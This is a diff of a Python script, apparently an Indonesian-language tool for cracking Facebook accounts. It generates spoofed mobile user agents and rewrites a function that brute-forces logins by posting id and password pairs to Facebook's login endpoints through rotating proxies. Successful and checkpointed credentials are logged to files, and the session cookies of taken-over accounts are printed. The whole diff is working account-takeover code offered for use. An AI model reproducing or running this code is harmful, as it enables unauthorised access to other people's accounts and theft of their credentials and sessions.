@@ -94,56 +94,22 @@ except Exception as e:
     exit()
 prox = open(".prox.txt", "r").read().splitlines()
 # ------------------[ USER-AGENT ]-------------------#
-class UserAgentGenerator:
-    def tobrut_ua(self):
-        # Versi Android
-        andro_version = random.choice(["4.4", "5.0", "5.1", "6.0", "7.0", "7.1", "8.0", "8.1", "9", "10", "11", "12", "13"])
-        # Nama perangkat
-        andro_build = random.choice([
-            "SM-G991B", "Pixel 6 Pro", "OnePlus 9", "Xiaomi 12", "Redmi Note 10",
-            "Galaxy A52", "Moto G Power (2022)", "Nokia X20", "Sony Xperia 1 III",
-            "Huawei P40 Pro", "SM-A515F", "SM-G973F", "Pixel 4 XL", "RMX3370",
-            "V2127", "CPH2305", "KFONWI", "ONEPLUS A6000", "MI 8 Lite"
-        ])
-        # Fingerprint Android
-        android_fingerprint = random.choice([
-            "google/redfin/redfin:11/RQ1A.210105.003/7087148:user/release-keys",
-            "google/raven/raven:12/SP1A.210812.016/7650812:user/release-keys",
-            "samsung/r0qxx/r0q:11/RP1A.200720.012/G991BXXU2AUG4:user/release-keys",
-            "OnePlus/instantnoodlep/instantnoodle:12/RKQ1.211103.002/08241715:user/release-keys",
-            "google/oriole/oriole:13/TP1A.220624.021/8725868:user/release-keys"
-        ])
-        # Versi aplikasi Facebook
-        facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 9)}.{random.randint(0, 9)}.{random.randint(1, 99)}.{random.randint(10, 999)}"
-        fbbv = str(random.randint(10000000, 99999999))
-        fbrv = str(random.randint(100000000, 999999999))
-        # Resolusi layar
-        density = f"{random.randint(1, 4)}.{random.randint(0, 9)}"
-        width = str(random.randint(300, 1080))
-        height = str(random.randint(600, 2400))
-        # Versi OS
-        os_version = f"{random.randint(8, 16)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-
-        # Pilihan User-Agent
-        user_agents = [
-            f"[FBAN/MessengerLiteForiOS;FBAV/{facebook_version};FBBV/{fbbv};FBDV/iPhone{random.randint(8,15)},{random.randint(0,9)};FBMD/iPhone;FBSN/iOS;FBSV/{os_version};FBSS/2;FBCR/;FBID/phone;FBLC/en_US;FBOP/0]",
-            f"[FB_IAB/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/it_IT;FBRV/{fbrv};FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/{andro_build};FBSV/{andro_version};FBOP/1;FBCA/x86:armeabi-v7a;]",
-            f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/ru_RU;FBRV/{fbrv};FBCR/MTS RUS;FBMF/{random.choice(['vivo','samsung','realme','xiaomi'])};FBBD/{random.choice(['vivo','samsung','realme','xiaomi'])};FBPN/com.facebook.katana;FBDV/{andro_build};FBSV/{andro_version};FBOP/1;FBCA/arm64-v8a:;]",
-            f"[FBAN/FB4A;FBAV/{facebook_version};FBPN/com.facebook.katana;FBLC/in_ID;FBBV/{fbbv};FBCR/ISAT-PEMILUDAMAI;FBMF/{random.choice(['realme','oppo','oneplus'])};FBBD/{random.choice(['realme','oppo','oneplus'])};FBDV/{andro_build};FBSV/{andro_version};FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;FBRV/0;]",
-            f"Mozilla/5.0 (Linux; Android {andro_version}; {andro_build} Build/{android_fingerprint}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,115)}.0.{random.randint(0,9999)}.{random.randint(0,999)} Mobile Safari/537.36 YandexBrowser/{random.randint(20,24)}.0.{random.randint(0,9999)}.0",
-        ]
-        return random.choice(user_agents)
-
-# Contoh penggunaan
-generator = UserAgentGenerator()
-
-
-try:
-	uasayang = open("ua.txt", "r").read().splitlines()
-	for fn in uasayang:
-		ugen.append(fn)
-except :
-	ua = "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
+rr = random.randint; rc = random.choice
+for fanky in range(10000):
+	rr = random.randint; rc = random.choice
+	aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
+	andro = str(rc(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13']))
+	lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
+	redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC", "LRX22G"]
+	samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY" ]
+	gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100']
+	
+	redmioi = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(94,100))}.0.{str(rr(4606,4900))}.{str(rr(71,100))} Mobile Safari/537.36"
+	samsungoi= f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(samsung))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(95,100))}.0.{str(rr(4638,4999))}.{str(rr(74,150))} Mobile Safari/537.36"
+	gtoi = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(gt))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(87,100))}.0.{str(rr(4280,4900))}.{str(rr(141,150))} Mobile Safari/537.36"
+	fangntg = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/{str(rr(87,100))}.0.{str(rr(4280,4900))}.{str(rr(141,150))} [FBAN/EMA;FBLC/{str(rc(["id-ID","id;q=0.9","en-US;q=0.8","en;q=0.7"]))};FBAV/{str(rr(87,100))}.0.0.{str(rr(9,100))}.{str(rr(141,150))};]"
+	rawrrr = random.choice([redmioi,samsungoi])
+	ugen.append(rawrrr)
 # ------------[ INDICATION ]---------------#
 M2 = "[#FF0000]"  # MERAH
 H2 = "[#00FF00]"  # HIJAU
@@ -955,54 +921,6 @@ def metcepat():
     print("")
 
 #-------------------[ CRACK-MAIN ]------------#
-def fankywww(idf, pwv):
-	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
-	rr = random.randint
-	rc = random.choice
-	ses = requests.Session()
-	prog.update(des,description=f" {K2}•{H2} FANKY WWW {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-	prog.advance(des)
-	#ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
-	#ua = f"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
-	ua = random.choice(ugen)
-	for pw in pwv:
-		try:
-			if 'ya' in ualuh: ua = ualu[0]
-			nip=random.choice(prox)
-			proxs= {'http': 'socks5://'+nip}
-			page_content  = ses.get(f'https://touch.facebook.com/login/?email={idf}',proxies=proxs).text
-			data = { "lsd": re.search('name="lsd" value="(.*?)"', page_content).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', page_content).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"', page_content).group(1), "li": re.search('name="li" value="(.*?)"', page_content).group(1), "try_number": "0", "unrecognized_tries": "0", "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw }
-			head = { "User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive", "Referer": "https://www.facebook.com/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "DNT": "1" }
-			fankyimut = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
-			po = ses.post(fankyimut, data=data,headers=head,allow_redirects=False,proxies=proxs)
-			if "checkpoint" in ses.cookies.get_dict().keys():
-				cp += 1
-				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
-				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok += 1
-				coki = ses.cookies.get_dict()
-				kuki = ("datr="+ coki["datr"]+ ";"+ ("sb=" + coki["sb"])+ ";"+ "locale=id_ID"+ ";"+ ("c_user=" + coki["c_user"])+ ";"+ ("xs=" + coki["xs"])+ ";"+ ("fr=" + coki["fr"])+ ";")
-				tree = Tree(Panel.fit(f"""{H2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
-				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-				prints(tree)
-				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-	
 def fankygraphv1(idf, pwv, url):
     global loop, ok, cp
     bo = random.choice([m, k, h, b, u, x])
@@ -1057,7 +975,98 @@ def fankygraphv1(idf, pwv, url):
             time.sleep(31)
 
     loop += 1
-    
+
+
+#-------------------[ CRACK-MAIN ]------------#
+def fankywww(idf, pwv):
+    global loop, ok, cp
+    bo = random.choice([m, k, h, b, u, x])
+    rr = random.randint
+    rc = random.choice
+    ses = requests.Session()
+    prog.update(des, description=f" {K2}•{H2} NYOBA DULU {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    ua = random.choice(ugen)
+    for pw in pwv:
+        try:
+            if 'ya' in ualuh: 
+                ua = ualu[0]
+            nip = random.choice(prox)
+            proxs = {'http': 'socks5://' + nip}
+            requ = ses.get(f'https://touch.alpha.facebook.com/login/?email=' + idf)
+            head = {
+                'authority': 'touch.alpha.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'dpr': '1.600000023841858',
+                'origin': 'https://touch.alpha.facebook.com',
+                'referer': 'https://touch.alpha.facebook.com/',
+                'accept-encoding': 'gzip, deflate',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
+                'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-model': '""',
+                'sec-ch-ua-platform': '"Linux"',
+                'sec-ch-ua-platform-version': '""',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': ua,
+                'viewport-width': '980'
+            }
+            data = {
+                'jazoest': re.search('name="jazoest" value="(.*?)"', str(requ.text)).group(1),
+                'lsd': re.search('name="lsd" value="(.*?)"', str(requ.text)).group(1),
+                'm_ts': re.search('name="m_ts" value="(.*?)"', str(requ.text)).group(1),
+                'li': re.search('name="li" value="(.*?)"', str(requ.text)).group(1),
+                'email': idf,
+                'pass': pw,
+                'next': ''
+            }
+            fankyimut = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
+            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
+            if "checkpoint" in ses.cookies.get_dict().keys():
+                cp += 1
+                tree = Tree(Panel.fit(f"""{M2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{M2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{M2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                break
+            elif "c_user" in ses.cookies.get_dict().keys():
+                ok += 1
+                coki = ses.cookies.get_dict()
+                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
+                tree = Tree(Panel.fit(f"""{H2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+                break
+            elif po.status_code == 302:
+            	cp += 1
+                tree = Tree(Panel.fit(f"""{K2}  CP AKUN BUTUH VERIFIKASI {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{k2}{ua}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop += 1
+
+
 def fankygraphv2(idf, pwv,url):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
